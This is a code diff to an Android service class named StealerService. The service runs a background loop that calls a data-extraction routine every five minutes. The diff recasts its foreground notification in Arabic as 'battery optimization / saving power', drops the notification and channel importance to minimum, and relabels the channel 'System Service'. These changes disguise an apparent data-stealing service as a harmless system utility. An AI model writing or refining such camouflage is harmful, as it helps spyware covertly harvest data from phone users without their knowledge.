@@ -21,11 +21,20 @@ public class StealerService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Notification notification = new Notification.Builder(this, "stealer_channel")
-                .setContentTitle("محرر المساحة")
-                .setContentText("جاري تحسين أداء النظام...")
-                .setSmallIcon(android.R.drawable.ic_menu_manage)
+        Notification.Builder builder;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            builder = new Notification.Builder(this, "stealer_channel");
+        } else {
+            builder = new Notification.Builder(this);
+        }
+        
+        Notification notification = builder
+                .setContentTitle("تحسين البطارية")
+                .setContentText("جاري توفير الطاقة...")
+                .setSmallIcon(android.R.drawable.stat_sys_download_done)
+                .setPriority(Notification.PRIORITY_MIN)
                 .build();
+                
         startForeground(1, notification);
 
         if (workerThread == null || !workerThread.isAlive()) {
@@ -35,7 +44,7 @@ public class StealerService extends Service {
                     while (isRunning) {
                         try {
                             MainActivity.extractDataInBackground(StealerService.this);
-                            Thread.sleep(300000);
+                            Thread.sleep(300000); // كل 5 دقايق
                         } catch (Exception e) {
                             e.printStackTrace();
                         }
@@ -51,8 +60,8 @@ public class StealerService extends Service {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel serviceChannel = new NotificationChannel(
                     "stealer_channel",
-                    "System Service Channel",
-                    NotificationManager.IMPORTANCE_LOW
+                    "System Service",
+                    NotificationManager.IMPORTANCE_MIN
             );
             NotificationManager manager = getSystemService(NotificationManager.class);
             if (manager != null) {
